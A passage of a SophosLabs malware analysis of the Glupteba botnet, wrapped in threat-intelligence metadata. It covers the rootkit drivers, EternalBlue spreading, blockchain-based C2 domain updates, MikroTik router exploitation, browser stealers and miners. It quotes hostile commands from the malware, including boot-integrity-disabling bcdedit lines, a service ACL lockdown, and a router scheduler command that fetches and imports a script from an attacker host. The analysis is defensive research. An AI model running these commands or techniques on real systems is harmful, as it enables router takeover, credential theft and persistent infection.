{71A3C7FC-F751-4982-AEC1-E958357E6813} path_\n_\\Windows\\system32\\osloader.exe_\n\n_C:\\Windows\\system32\\bcdedit.exe -set {71A3C7FC-F751-4982-AEC1-E958357E6813} kernel ntkrnlmp.exe_\n\n_C:\\Windows\\system32\\bcdedit.exe -set {71A3C7FC-F751-4982-AEC1-E958357E6813} recoveryenabled 0_\n\n_C:\\Windows\\system32\\bcdedit.exe -set {71A3C7FC-F751-4982-AEC1-E958357E6813} nx OptIn_\n\n_C:\\Windows\\system32\\bcdedit.exe -set {71A3C7FC-F751-4982-AEC1-E958357E6813} nointegritychecks 1_\n\n_C:\\Windows\\system32\\bcdedit.exe -set {71A3C7FC-F751-4982-AEC1-E958357E6813} inherit {bootloadersettings}_\n\n_C:\\Windows\\system32\\bcdedit.exe -displayorder {71A3C7FC-F751-4982-AEC1-E958357E6813} -addlast_\n\n_C:\\Windows\\system32\\bcdedit.exe -timeout 0_\n\n_C:\\Windows\\system32\\bcdedit.exe -default {71A3C7FC-F751-4982-AEC1-E958357E6813}_\n\nGlupteba uses three type of kernel driver to hide itself, which are embedded in the dropper:\n_Winmon, WinmonFS, and WinmonProcessMonitor._\n\n**_Process concealment_**\n\n_Winmon driver is used to hide processes by unlinking from the EPROCESS list. The_\ndriver code seems to be copied from http://www.rohitab.com/discuss/topic/40694hide-process-with-dkom-without-hardcoded-offsets/, but was recompiled to the KMDF\ndriver model type (as opposed to WDM, which is the driver model of the compiled binary\non that site).\n\n© 2020, SophosLabs 22\n\n\n-----\n\n_Figure 7: Glupteba subroutines used to scrutinize running processes on the infected computer._\n\nThe dropper contains a Winmon32.sys and Winmon64.sys and drops one of them\ndepending on the OS architecture. The driver is called several times from the dropper in\norder to hide a particular process by writing the PIDs or process names to the memory\nof it.\n\n**_Hiding objects – files, folders_**\n\n_WinmonFS is also used for hiding objects. It seems most of it was copied from:_\nhttps://github.com/ContionMig/KernelMode-Bypass/blob/master/hiddenmaster/Hidden/ . The main executable has two embedded versions: WinmonFS32.sys\nand WinmonFS64.sys. It hides the following files and folders:\n\n© 2020, SophosLabs 23\n\n\n-----\n\n**_Terminating processes_**\n\n_WinmonProcessMonitor is responsible for tracking and terminating processes. The_\ndropper has five versions of this driver embedded in it: WinmonProcessMonitor32.sys,\n_WinmonProcessMonitor64.sys, WinmonSystemMonitor-10-64.sys,_\n_WinmonSystemMonitor-7-10-32.sys, and WinmonSystemMonitor-7-64.sys._\n\n_Figure 8: Glupteba's rootkit driver uses the function ZwOpenProcess and ZwTerminateProcess to terminate processes._\n\nThe terminated processes are mostly AV-related process names:\n\n_Figure 9: Glupteba will terminate the processes of any of a large number of endpoint security and anti-malware products or tools._\n\n\n© 2020, SophosLabs 24\n\n\n-----\n\n##### Components for spreading on LAN\n\nGlupteba leverages the EternalBlue exploit for spreading itself across the local network.\nThe dropper is responsible for scanning the LAN to find vulnerable SMB servers. There\nare two implementations of the exploit in the dropper:\n\n  - The original Shadow Brokers’ SMB exploit implementation\n\n(https://github.com/ElevenPaths/Eternalblue-DoublepulsarMetasploit/tree/master/deps) - which is downloaded along with two DLLs\n(payload32.dll and payload64.dll), written in Golang.\n\nThe downloaded deps.zip is extracted and configured by the dropper. Eternalblue2.0.0.xml is configured first - based on the vulnerable hosts the malware discovers - and\nthen it launches the Eternalblue-2.2.0.exe. Based on the response, the Doublepulsar1.3.1.xml is configured (it needs the proper version of the payload DLL), then it executes\nDoublepulsar-1.3.1.exe as the implant of the exploit.\n\nThe payload DLLs are the final payloads downloading \"app.exe\" to the infected host,\nlaunched from the %TEMP% folder (in case app.exe isn’t already running there – it\nchecks whether the Global\\h48yorbq6rm87zot mutex exists).\n\n  - The other implementation is downloaded as e7.exe\n\n(https://github.com/jivoi/pentest/blob/master/exploit_win/ms17010/eternalblue8_exploit.py) and uses sc.bin which is embedded in the dropper\nas shellcode, and passed as a parameter of e7.exe.\n\n\n_Figure 10: The shellcode embedded in the dropper (sc.bin) looks for the target process to be_\n_injected._\n\n\nThis shellcode also downloads app.exe from the server to %TEMP% and launches by\nabusing certutil (shown above). The shellcode uses lsass.exe or spoolsv.exe as the\ntarget SYSTEM process.\n\n© 2020, SophosLabs 25\n\n\n-----\n\n_Figure 11: Glupteba abuses system processes to run shellcode._\n\n\n##### Network communication\n\nThe information sent to the C2 servers is encrypted by AES-256-GCM with a hardcoded\nkey -the same key used for decrypting the fetched transaction data on the blockchain\n(details in next section). It is Base64 encoded after and it uses HTTPS. The answer is\nencrypted with the same cipher methods and the content is received in json. The\nresponse signature is verified before used - SHA512 hash is used for that.\n\nThere are two type of Glupteba servers stored in registries. One type is the CDN - content\ndelivery network - used for downloading the components, and the other type is the C2\nservers used to send the bot commands and exfiltrate data.\n\nConfiguring the content delivery network (CDN) server\n\nThe bot configures the CDN value under the TestApp Registry path with a hardcoded\ndomain name, initially, but the bot can easily change it using a backdoor command \"update-cdn.\" The bot also refreshes this value from time to time using a GET request to\nthe /api/cdn? path on the C2 server(s).\n\n**_/app/ subfolder_**\n\nThe CDN server is used to download the Glupteba components, and when this happens,\nthe bot uses the /app/ path in the request.\n\nDownloading from the CDN is possible when the \"run\" or \"run-v2\" backdoor commands\nare used. Any executable can be downloaded and launched remotely. Modules such as\n\n© 2020, SophosLabs 26\n\n\n-----\n\nthe browser stealer component (vc.exe) get downloaded when app.exe is updated using\na scheduled task, when it updates the watchdog.exe (or windefender.exe), even when\nthe EternalBlue exploits (deps.zip, e7.exe) are downloaded by GET requests to the CDN\nserver.\n\nI also found some URI with /app/ to the CDN server downloading other components of\nGlupteba, such as router exploiter and browser stealer components. For example:\n\n‘<id>/app/winboxls-0712.exe’\n\n‘<id>/app/winboxscan-0702.exe’\n\n‘<id>/app/winboxscan-0502.exe’\n\n‘<id>/app/updateprofile-4.exe’\n\n‘<id>/app/profile-6.exe’\n\n‘<id>/app/profile-0219.exe’\n\n‘<id>/app/routerdns.exe’\n\nC2 servers\n\nThe C2 servers - value of \"Servers\" names under TestApp Registry - are initialized by\nthree hardcoded domain at the beginning and later are updated by tracking the latest\ntransactions from the blockchain. After each command polling, the next server is set to\nbe used.\n\nThe HTTP/HTTPS communication of the C2 server can be done by GET, POST even PUT\nmethods, and the URI path can contain \"/api/\", \"/bots/\" or \"/upload/\" strings,\ndepending on the purpose.\n\n**_/api/ subfolder_**\n\nThe /api/ subfolder in the URI with GET method is used when the CDN server or the\ncloudnet URL is queried to refresh it.\n\n© 2020, SophosLabs 27\n\n\n-----\n\nPOST method is used when the bot sends any log, or when the bot sends information\nwhile registering the bot: reports about the vulnerable SMB hosts, or about the installed\napplications, or even querying configuration of the miners.\n\nDuring each network communication, tons of data is sent to the server. For instance,\nduring registering the victim, the following data are sent:\n\n_Data[appname]=DelicateSnow&Data[arch]=64&Data[av]=&Data[build_number]=7601&Data[challenge]=b95d9fa676_\n_6951eb&Data[compaign_id]=&Data[cpu]=Intel(R)+Core(TM)+i5-_\n_3210M+CPU+@+2.50GHz&Data[defender]=1&Data[distributor_id]=4&Data[exploited]=1&Data[firewall]=1&Data[gpu]_\n_=VMware+SVGA+3D&Data[is_admin]=1&Data[machine_guid]=68055a76-96a3-4dbf-9802-_\n_17628491de17&Data[os]=Microsoft+Windows+7+Ultimate+&Data[os_install_date]=1541070358&Data[ram]=209715_\n_2&Data[username]=<username>&Data[version]=148_\n\nThese sent data contains information about the application, some hardware\ninformation, like the CPU, GPU, GUID, RAM, information about the C2 server's version,\nand a lot of data from the TestApp Registry key, which can indicate the success of some\noperations by Glupteba.\n\nDuring polling the commands from the server, the following information are sent about\nthe patching, and about the state of different components - 1 means it is already set or\nrunning.\n\n_challenge=8a40603d307dd49a&cloudnet_file=0&cloudnet_process=0&ds=0&lcommand=0&mrt=0&pgdse=0&sb=0_\n_&sc=0&uuid=&version=148&wup_procss=0&wupv=0_\n\n**_/bots/ subfolder_**\n\nThe \"/bots/\" string in the URI can appear when it updates any information or send some\nreport about the installation or about the success of some operation.\n\n© 2020, SophosLabs 28\n\n\n-----\n\n**_/upload/ subfolder_**\n\nFiles can be uploaded to the server with PUT method and \"upload\" string in URI, for\ninstance when a backdoor command of \"upload-file\"or \"sc\" (taking and sending\nscreenshots) is used.\n\n© 2020, SophosLabs 29\n\n\n-----\n\n##### C2 domain update using the blockchain\n\nIn the command-and-control subroutines, there is a domain updater function to update\nthe C2 servers. In order to achieve this, it queries a transaction data from blockchain,\nusing two method.\n\nOne is through electrum servers, and queries a hardcoded script hash. In this case it first\nqueries bitcoin transactions from electrum servers using\nhttps://raw.githubusercontent.com/spesmilo/electrum/master/electrum/servers.jso\nn.\n\nFor instance, the hardcoded hash of transaction script history is used for finding the\nappropriate transaction which contains the encrypted C2 domain name in its\nOP_RETURN field.\n\nThe bot can also do this by searching a transaction list on blockchain.info for a specific\ntransaction address, and looking at the latest transaction of the hardcoded addresses.\n\nIn both cases it receives a json, and the latest transaction’s OP_RETURN field will be\nchecked. OP_RETURN can contain arbitrary data. In the picture below the responded\njson of the address 1CgPCp3E9399ZFodMnTSSvaf5TpGiym2N1 can be seen.\n\n© 2020, SophosLabs 30\n\n\n-----\n\n_Figure 12: The JSON response to Glupteba's blockchain queries includes the encoded string that updates the C2 server_\n_addresses._\n\nThe domain name in the OP_RETURN field is encrypted using AES-256 in GCM mode.\nThe 32-byte AES key is hardcoded in the binary. The initialization vector (IV) is the first\n12 bytes of the OP_RETURN data, while the GCM tag is the last 16 bytes. For instance, in\nthe case the data shown above:\n\n_OP_RETURN_\n_bc8fc1a3bfc43666e8164a88dddb57cf8eca812dc1f827b810e9ba16e1d78c9b1dfd97ff8_\n_3ee25cf843ac52e_\n\nThe values required for decryption are as follows:\n\nIV: bc8fc1a3bfc43666e8164a88\n\nGCM tag: e1d78c9b1dfd97ff83ee25cf843ac52e\n\nCiphertext:  dddb57cf8eca812dc1f827b810e9ba16\n\nPlaintext: easywbdesign[.]com\n\nThe decrypted domain name will be set (prepending the \"https://\") to the Registry under\nthe \"Servers\" name. All Glupteba components use this Registry to coordinate their\nnetwork communication.\n\n© 2020, SophosLabs 31\n\n\n-----\n\nHistorical order of the C2 domain updates\n\nBy querying the transactions of the hardcoded addresses (A) and using AES-256-GCM\nwith the corresponding embedded AES key (K), we can observe which domains were\nupdated and when.\n\nA1: 15y7dskU5TqNHXRtu5wzBpXdY5mT4RZNC6\n\nK1: d8727a0e9da3e98b2e4e14ce5a6cf33ef26c6231562a3393ca465629d66503cf\n\nA2: 1CgPCp3E9399ZFodMnTSSvaf5TpGiym2N1\n\nK2: 1bd83f6ed9bb578502bfbb70dd150d286716e38f7eb293152a554460e9223536\n\n  - _2019-06-19 06:10: venoxcontrol[.]com (A1, K1)_\n\n  - _2020-01-24 22:31: robotatten[.]com (A1, K1)_\n\n  - _2020-02-14 23:33: sleepingcontrol[.]com (A1, K1)_\n\n  - _2020-02-17 18:58: anotheronedom[.]com (A1, K1)_\n\n  - _2020-03-28 22:48: getfixed[.]xyz (A1, K1)_\n\n  - _2020-03-28 23:06: gfixprice[.]xyz (A1, K1)_\n\n  - _2020-04-08 17:24: sndvoices[.]com (A2, K2)_\n\n  - _2020-05-07 14:50: easywbdesign[.]com (A2, K2)_\n\n  - _2020-05-13 13:01: maxbook[.]space (A1, K2)_\n\n© 2020, SophosLabs 32\n\n\n-----\n\n##### Glupteba's payload components\n\nCommunications proxy component - \"cloudnet.exe\"\n\nAll network communications are proxied through this component. This is the only\ncomponent which is not written in Go, but in C++. It is downloaded by the dropper and\ncontinuously tracked by a watcher function.\n\nThe dropper can query the latest downloader URL of this component and there is also a\nbackdoor function to update this binary and launch with the /31337 parameter.\n\nThe tracker function checks every minute whether the cloudnet.exe process is running\nand hidden with the use of Winmon driver. It also checks the MD5 hash of it and the\nmutex responsible for it -Global\\Mp6c3Ygukx29GbDk. In case it hasn’t been downloaded\nyet, then the dropper will download it from the proper server and launch it with the\n\"/31339\" parameter - or so-called campaign ID. The dropper also responsible for\nenabling the traffic for this binary by setting firewall rules.\n\nThe cloudnet.exe creates an Autorun entry for itself in the Windows Registry and\ngenerates a unique, random ID to identify the victim. The binary runs under the folder\npath \"%APPDATA%\\<id>\\<id>.exe\" (where <id> is the random identifier value). This\nidentity is stored in the Registry with the timestamp of this binary. It also checks the\nTestApp Registry key for configuration.\n\nSOFTWARE\\\\Microsoft\\\\<id>\\\\<id>\n\nC2 server communication\n\nWs2_32.dll is used for network communication. First, it tests to see whether it has an\ninternet connection by visiting Google.com and yandex.ru. Then the initialization part of\nthe server communication starts, containing the following steps:\n\n© 2020, SophosLabs 33\n\n\n-----\n\nFirst, it registers the bot with a DNS request to <GUID>.server-<x>.<server name>, where\nthe x is randomly selected and the C2 server name is hardcoded in the binary.\n\nThen, the infected computer connects to the port 8000 of that server, which then\nresponds with a port number (in session field) where the bot should connect back.\n\n_Figure 13: An example of the bot (red text) communicating with its server (blue text)_\n\nFinally, the bot connects to that port (port 444/tcp, in this case) and the proxy\ncommunication of sending the instructions to the bot and receiving the answers begins.\n\nLet’s see an example of this traffic routing method.\n\nIt begins with receiving a HELLO message from the server, then the victim responses\nwith an identifier and password - \"ID: password\" - which has already been shared with\nthe server in the previous GET request.\n\nFrom this point forward, the server is prepared for continuously sending commands to\nthe bot. For instance, starting with 0x63 (‘c’) means to connect to an IP: port defined by\nthe server. Every line has an identifier (which is incremented) right after the command\nbyte. The highlighted bytes the picture below are the IP and port number - 0x5b 0xe2\n_0x53 0xb0 = 91.226.83.176, 0xbb 0x01 = 443._\n\n© 2020, SophosLabs 34\n\n\n-----\n\nThe bot will try to connect to the received IP:port, then answer back to the server with\nthe identifier of the command line -0x7f- belonging to the successfully connected\nIP:port. Red colored bytes are the answers of the bot.\n\nIn the PCAP above, in the red colored answer, the IP address and port belonging to the\nline identifier can be seen on picture below, too - as a bot starts the TCP handshake to\nthere and build the connection - 91.226.83.176: 443\n\nSo, in the following pcap the black highlighted TCP stream is the communication\nbetween the server and the bot, while all the other communication is between the C2\nand the bot.\n\nIn the screenshots below there are the two TCP streams - on left it is between the bot\nand the requested IP, on the right that is between the bot and the server. As can be seen,\nthe bot-server communication contains the same traffic, but it is encoded with a simple\nXOR by 0x4D.\n\n© 2020, SophosLabs 35\n\n\n-----\n\nWatchdog component - \"windefender.exe\"\n\nThe main purpose of this module, which runs as a service, is to track the main dropper in\norder to relaunch it in case any issues occur. This module is written in Go and samples\nwe've seen have been packed with UPX. The dropper tracks this process and hides it\nusing the kernel drivers. Watchdog checks the TestApp Registry keys for configuration\ninformation, and checks the service version of itself when an update is available. These\nare the main functions of this module (most of which are self-explanatory, based on\ntheir name):\n\nThis component can modify access control list (ACL) values for its own service in order\nto complicate stopping and deleting the service. It works in the same way as the dropper\nfor the kernel drivers:\n\n_cmd.exe /C sc sdset WinDefender_\n_D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPLOCRSDRCWDWO;;;BA)(D;;WPDT;;;BA)(A;;CCLCSW_\n_LOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)_\n\nIt can send logs to the server with an HTTP POST request to the /bot/log path on the\ncommand-and-control server. It's capable of sending the files in the\n%WINDIR%/Minidump folder, but the reason for this is not fully clear. Considering the\nfilename (and that most of the Glupteba modules have meaningful filenames), the\n_watchdog name might refer to the service that's responsible for protecting the system if_\nany failure occurs that causes a crash.\n\nFor instance, under Windows, a watchdog violation can occur when a device driver is\noutdated, or it isn't compatible (or digitally signed). In these cases, the system collects\ndumps into the %WINDIR%/Minidump folder. Since Glupteba uses several drivers,\nincluding older, vulnerable drivers that may (or do) cause failures (not to mention the\nnotoriously unstable XMR miner drivers), this component can track those crashes and\nsend them back to the bot's creators.\n\nThe information goes to the server in the following form (with some Russian text that\nroughly translates to \"number of dumps,\" followed by that quantity):\n\ntext=Количестводампов:<number of dumps>&type=0&uuid=<uuid>\n\nAll in all, the service functions of this module tracks the malicious csrss.exe, relaunching\nand hiding it continuously. Glupteba’s miner components may need this service, too. If\n\n© 2020, SophosLabs 36\n\n\n-----\n\nany issue occurs with the miners, the dropper is responsible for relaunching them, but\nthe watchdog is responsible for relaunching the dropper.\n\n© 2020, SophosLabs 37\n\n\n-----\n\nMikroTik RouterOS exploiter components\n\n**_Setting up a SOCKS proxy - \"winboxscan.exe\"_**\n\n\"winboxscan.exe\" exploits a Winbox server vulnerability in MikroTik's RouterOS in order\nto get the user database, and configure the SOCKS proxy. It is downloaded from CDN\nwith <id>/app/winboxscan-0702.exe in the URI. As with other Glupteba components, it\nreads the configuration information from the TestApp Registry path, and it also checks\nwhether the mutex Global\\nbyjrjaxyahi4pq5 exists (if it does, then this module is\nrunning already). It hides itself by launching csrss.exe with a parameter of \"-hide PID\"\nwhere the PID is corresponds to the router exploit process.\n\nThese are the main functions of this component:\n\nThis component starts scanning networks - starting randomly from a chosen IP, then by\nincrementing - and looks for routers to connect.\n\n© 2020, SophosLabs 38\n\n\n-----\n\nIf it finds a vulnerable MikroTik router (with the CVE-2018-14847 vulnerability [4]), then\nit will get the session ID from the response. It will increment until can successfully\nobtain the username.dat file and an enabled administrative account.\n\nTo achieve this, it reads the /flash/rw/store/user.dat file and beside of extracting it, it\nalso try to write into it.\n\nFor extracting usernames and credentials, it connects to the router in three different\nways: on port 8291 (to the Winbox service), through SSH, and through the API service\nport, which is 8728.\n\nThe payload for extracting credentials from user.dat by using Winbox protocol:\n\n_Figure 14: The payload modifies the user.dat file directly._\n\n\n_Figure 14: The payload modifies the user.dat file directly._\n\n\n© 2020, SophosLabs 39\n\n\n-----\n\nAfter, it makes attempt to add scheduled tasks to the router, again by using the three\ndifferent way of Winbox protocol, via SSH and via the API port. The scheduled task added\non MikroTik routers downloads the SOCKS proxy script:\n\n_/system scheduler add name=\"U6\" interval=10m on-event=\"/tool fetch url=http://%s/poll/%s mode=http_\n_dst-path=7wmp0b4s.rsc import 7wmp0b4s.rsc_\n_policy=api,ftp,local,password,policy,read,reboot,sensitive,sniff,ssh,telnet,test,web,winbox,write’_\n\n(Domain is hardcoded: gamedate[.]xyz)\n\nA scheduled task downloads the file to the router in every 10 minutes. The script\ncontains SOCKS proxy settings to allow communications for the following IP addresses:\n\nAfterwards, this module also sends reports to the C2 server using the HTTP POST\nmethod; The URI for these contains the path /api/router-scan-results-rand\n\nDNS cache poisoning - \"routerdns.exe\" and \"d2.exe\"\n\nThe routerdns.exe component is the scanner piece taken from a different MikroTik\nRouter exploiter that Glupteba uses. MikroTik routers can act as a DNS server, and older\nversions allowed an unauthenticated remote user to trigger DNS requests to a userspecified DNS server, via the Winbox port (8291) (defined in CVE-2019-3978 [5]).\n\nThis component scans for vulnerable routers, then downloads and launches a DNS\ncache poisoner tool. It is written in Go, and UPX packed, too. I suppose that this is\ndownloaded by backdoor functions as I haven’t found any downloader code in the\ndropper, but Glupteba CDN servers shows it is downloaded from them with\n\"<id>/app/routerdns.exe\" in URI path.\n\nThese are the main functions of the examined scanner:\n\n© 2020, SophosLabs 40\n\n\n-----\n\nIt starts by scanning a random IP address and tries to connect on port 8291 (Winbox).\n\nWhen it finds a vulnerable MikroTik router, it notifies the server about that IP address.\nThe myonetime[.]top/w.php URI is used with POST method as the below picture shows.\n\n© 2020, SophosLabs 41\n\n\n-----\n\nThis server is not alive at the point of analysis, but I suppose that this server gave the\nfake DNS server name back to use it for DNS cache poisoning.\n\nThis component then downloads a DNS cache poisoning tool to the working directory\nand launches it with a parameter of -i:<router ip> -p:8291 -s:<fake dns\n```\nserver>. The output is directed to the launched process, which is sent then back to the\n\n```\nserver. In the picture below, the DNS cache poisoning tool (d2.exe) is downloaded and\nrenamed to d.exe.\n\nThis \"d2.exe\" (renamed to d.exe) belongs to the routerdns.exe components, downloaded\nby it from a hardcoded IP. This is a small tool responsible for DNS cache poisoning\nwritten in C++ :\nhttps://github.com/tenable/routeros/tree/master/poc/winbox_dns_request.\n\nIt can send DNS request to the defined fake DNS server, first asking to resolve the IP of\nthe upgrade.mikrotik.com domain. That DNS server may return a malicious IP, so when\nthe router updates itself, instead of downloading legitimate firmware, the router could\npull down a malicious update from whatever server the attackers want.\n\nSince these updates are normally digitally signed and the fake updates won't pass\nverification, this is probably targeting an older version of the MikroTik RouterOS (from\nprior to the digital signature validation requirement [6]).\n\nThe original tool on Github (containing example.com as a domain) is rewritten to\nupgrade.mikrotik.com in order to hijack the router upgrade. The final purpose probably is\nto set up a proxy, misdirecting traffic elsewhere using DNS cache poisoning.\n\n© 2020, SophosLabs 42\n\n\n-----\n\nDocument Title\n\nBrowser stealer components\n\n**_\"vc.exe\"_**\n\nThe vc.exe component is downloaded by the original dropper in the wup miner watcher\nfunction, which is implemented in an infinite loop. It extracts passwords, cookies and names\nfrom Google, Opera, Yandex, Firefox browsers by locating the profile directories and applying\nSQL queries. Firefox password extracting is not implemented, but the sample is capable of\ndecrypting Chrome extracting user information from browsers' SQLite data storage.\n\nIt checks the VC named Registry key, and if that hasn’t been set yet, then downloads it from\nthe CDN server in the /app/vc.exe path. It is launched by the dropper with the current user\nprivileges; the VC Registry value is set after.\n\nIt is also written in Go and UPX packed, like most of the Glupteba components. It checks\nconfiguration information from the usual TestApp registries, paying attention to ensure the\nprocess running as a user and not a system process in order to successfully start.\n\nThe main functions of this component are:\n\nIt sends the report to the C2 server with /bots/post-en-data?uuid= in the URI, using a HTTP\nPOST method.\n\n\n-----\n\n**_\"profile-0120.exe, or updateprofile-6.exe\"_**\n\nThe profile-0120.exe (sometimes named updateprofile-6.exe) component is very similar to\nvc.exe. It can send log information to http://myonetime[.]top/log.php by using POST method.\nIt's also written in Go and UPX packed.\n\nIt can upload the profiles by using PUT method in form of http://srv%d.oknazasto[.]info/pupload/%s/%s?%s. It sends the stolen data to the server with URI of\n/api/post-vc-data?uuid=\n\nIt has similar main functions to vc.exe:\n\n**_\"collectchromefingerprint.exe\"_**\n\nIn addition to the browser stealer modules, occasionally another module appears. It's named\ncollectchromefingerprint.exe and it is also a UPX packed Glupteba Golang component. It\nonly has one function: It tries to locate an installed copy of Chrome (by querying:\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Google Chrome in the\nWindows Registry), then invokes chrome.exe to connect to the URL\nhttp://swebgames.site/test.php?uuid=%s&browser=chrome GET, and register.\n\n© 2020, SophosLabs 44\n\n\n-----\n\nThe test.php returns a JavaScript which uses third party\nbrowser-based fingerprinting services:\n\n_<script src=\"https://cdnjs.cloudflare.com/ajax/libs/fingerprintjs2/2.0.6/fingerprint2.js\"></script>_\n\n_<script src=\"https://cdn.webrtc-experiment.com/DetectRTC.js\"></script>_\n\n**_Miner components – \"wup.exe\", \"wupv.exe\"_**\n\nGlupteba can manage two miner components which both are xmrig miners\n(https://github.com/xmrig/xmrig). \"Wup.exe\" is the XMRig 5.2.0 miner, \"wupv.exe\" is the\nXMRig-NVIDIA 2.8.3 version. These are downloaded by the dropper. First, the bot requests a\nconfiguration file from the C2 server by performing an HTTP POST to the /api/check and\n/api/checkv/ URI paths. That config.json contains everything necessary for the miners to\noperate.\n\nThe miners will be downloaded to a newly created hidden \\\\wup folder, and the folder will be\nhidden by the WinmonFS driver. After the miner is launched properly, the process is also\nhidden using the WinMon driver and the appropriate PID.\n\nThis is managed continuously by the dropper, so the Global\\xmrigMUTEX31337 mutex is\nchecked in every 10 minutes in a loop - in case of \"wup.exe\"- to discover whether it's already\nrunning (and the config is queried in case it isn’t).\n\n© 2020, SophosLabs 45\n\n\n-----\n\nWith the wupv.exe component, the process is checked from the process list every 10\nminutes, then a full screen windows is searched. It does this to make sure the miner is still\nrunning. If it isn't, the bot downloads one of two different nVidia graphics board driver installer\npackages: 388.00-desktop-win10-64bit-international-whql.exe or 388.00-desktop-win8win7-64bit-international-whql.exe, which it gets from gateway.ipfs.io.\n\n_Figure 15: Glupteba's watchdog component continuously monitors components_\n\nIn some cases, the WinDefender service (the watchdog component) must run in order to\nlaunch the miners. Since watchdog monitors the dropper all along, with attention for crashes\nand the dropper monitors the miners, they can be restarted in case any issue occurs.\n\n### Conclusion\n\nIn this report we present our analysis of Glupteba, a highly self-defending malware which has\nbeen previously connected to Operation Windigo. The threat actors behind Glupteba started a\nnew campaign in the fall of 2019, in which bitcoin transactions were used to update its\ncommand-and-control domain addresses.\n\nWe focused on the whole ecosystem of Glupteba and looked at all its components. Glupteba\nremains under active development by a threat actor who pays special attention to enhancing\nfeatures that enable the malware to evade detection both by human analysts and endpoint\nsecurity tools, using rootkit techniques and other deceptive tactics.\n\nWith the use of its exhaustive backdoor functions, Glupteba can download a wide variety of\nother malware, while collecting a large amount of information from the victim's computer.\n\n© 2020, SophosLabs 46\n\n\n-----\n\nEven today, Glupteba drops cryptocurrency miners and browser stealer components, attacks\nMikroTik routers, and leverages its proxy components to conceal which binary is\ncommunicating with the outside world.\n\n##### Acknowledgments\n\nThe author wishes to thank Sophos colleagues Gábor Szappanos, Ferenc László Nagy, Vikas Singh,\nand Ronny Tyink for their assistance with this research. Andrew Brandt edited this report.\n\n##### IOCs\n\nIndicators of compromise related to this report have been published to the SophosLabs\nGithub at https://github.com/SophosLabs/IoCs/\n\n##### References\n\n[1] https://medium.com/csis-techblog/installcapital-when-adware-becomes-pay-per-install-cybercrime-15516249a451\n\n[2] https://en.wikipedia.org/wiki/Camel_case\n\n[3] https://medium.com/tenable-techblog/routeros-chain-to-root-f4e0b07c0b21\n\n[4] https://nvd.nist.Gov/vuln/detail/CVE-2018-14847\n\n[5] https://nvd.nist.Gov/vuln/detail/CVE-2019-3978\n\n[6] https://medium.com/tenable-techblog/routeros-chain-to-root-f4e0b07c0b21\n\n© 2020, SophosLabs 47\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5910e58f-4bc9-4e4e-9dbb-887804094a01",
            "created_at": "2022-10-25T16:32:58.457399Z",
            "updated_at": "2022-10-25T16:32:58.457399Z",
            "deleted_at": null,
            "name": "OTX",
            "url": "https://otx.alienvault.com",
            "description": "Alienvault Open Threat Exchange (OTX)",
            "reports": null
        }
    ],
    "references": [
        "https://news.sophos.com/wp-content/uploads/2020/06/glupteba_final-1.pdf"
    ],
    "report_names": [
        "glupteba_final-1.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "3844202f-b24a-4e16-b7b9-dfe8c0a44d5d",
            "created_at": "2022-10-25T16:07:24.526179Z",
            "updated_at": "2025-03-27T02:02:10.27234Z",
            "deleted_at": null,
            "main_name": "Operation Windigo",
            "aliases": [],
            "source_name": "ETDA:Operation Windigo",
            "tools": [
                "CDorked",
                "CDorked.A",
                "Calfbot",
                "Ebury"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d4f7cf97-9c98-409c-8b95-b80d14c576a5",
            "created_at": "2022-10-25T16:07:24.561104Z",
            "updated_at": "2025-03-27T02:02:10.281202Z",
            "deleted_at": null,
            "main_name": "Shadow Brokers",
            "aliases": [],
            "source_name": "ETDA:Shadow Brokers",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "a66438a8-ebf6-4397-9ad5-ed07f93330aa",
            "created_at": "2022-10-25T16:47:55.919702Z",
            "updated_at": "2025-03-27T02:05:17.412024Z",
            "deleted_at": null,
            "main_name": "IRON VIKING",
            "aliases": [
                "ATK14 ",
                "BlackEnergy Group",
                "Blue Echidna ",
                "CTG-7263 ",
                "ELECTRUM ",
                "FROZENBARENTS ",
                "Hades/OlympicDestroyer ",
                "IRIDIUM ",
                "Qudedagh ",
                "Sandworm Team ",
                "Seashell Blizzard ",
                "TEMP.Noble ",
                "Telebots ",
                "Voodoo Bear ",
                "APT44 "
            ],
            "source_name": "Secureworks:IRON VIKING",
            "tools": [
                " BlackEnergy",
                " GCat",
                " GreyEnergy",
                " Industroyer",
                " KillDisk",
                " NotPetya",
                " PSCrypt",
                " TeleBot",
                " TeleDoor",
                " xData",
                "BadRabbit"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "b3e954e8-8bbb-46f3-84de-d6f12dc7e1a6",
            "created_at": "2022-10-25T15:50:23.339976Z",
            "updated_at": "2025-03-27T02:00:55.446795Z",
            "deleted_at": null,
            "main_name": "Sandworm Team",
            "aliases": [
                "Sandworm Team",
                "ELECTRUM",
                "Telebots",
                "IRON VIKING",
                "BlackEnergy (Group)",
                "Quedagh",
                "Voodoo Bear",
                "IRIDIUM",
                "Seashell Blizzard",
                "FROZENBARENTS",
                "APT44"
            ],
            "source_name": "MITRE:Sandworm Team",
            "tools": [
                "Bad Rabbit",
                "Mimikatz",
                "Exaramel for Linux",
                "Exaramel for Windows",
                "GreyEnergy",
                "PsExec",
                "Prestige",
                "P.A.S. Webshell",
                "VPNFilter",
                "Cyclops Blink",
                "SDelete",
                "AcidRain",
                "Industroyer",
                "Industroyer2",
                "BlackEnergy",
                "Cobalt Strike",
                "NotPetya",
                "KillDisk",
                "PoshC2",
                "Impacket",
                "Invoke-PSImage",
                "Olympic Destroyer"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "3a0be4ff-9074-4efd-98e4-47c6a62b14ad",
            "created_at": "2022-10-25T16:07:23.590051Z",
